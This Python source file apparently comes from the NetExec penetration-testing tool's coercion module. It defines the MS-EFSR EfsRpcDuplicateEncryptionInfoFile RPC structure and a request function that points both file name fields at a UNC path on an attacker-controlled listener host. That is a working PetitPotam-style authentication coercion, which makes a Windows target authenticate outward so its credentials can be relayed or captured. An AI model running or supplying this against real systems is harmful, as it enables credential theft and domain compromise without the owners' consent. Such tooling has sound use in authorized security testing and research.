from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, DWORD, BOOL

from nxc.modules.coerce_plus_method.MS_EFSR.dtypes import EFS_RPC_BLOB
from nxc.data.coercer_method.DCERPCSessionError import DCERPCSessionError


class EfsRpcDuplicateEncryptionInfoFile(NDRCALL):
    """Structure to make the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 13
    structure = (
        ("SrcFileName", WSTR),  # Type: wchar_t *
        ("DestFileName", WSTR),  # Type: wchar_t *
        ("dwCreationDisposition", DWORD),  # Type: DWORD
        ("dwAttributes", DWORD),  # Type: DWORD
        ("RelativeSD", EFS_RPC_BLOB),  # Type: EFS_RPC_BLOB *
        ("bInheritHandle", BOOL),  # Type: BOOL
    )


class EfsRpcDuplicateEncryptionInfoFileResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcDuplicateEncryptionInfoFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


def request(dce, target, listener):
    request = EfsRpcDuplicateEncryptionInfoFile()
    request["SrcFileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
    request["DestFileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
    request["dwCreationDisposition"] = 0
    request["dwAttributes"] = 0
    request["RelativeSD"] = EFS_RPC_BLOB()
    request["bInheritHandle"] = 0
    dce.request(request)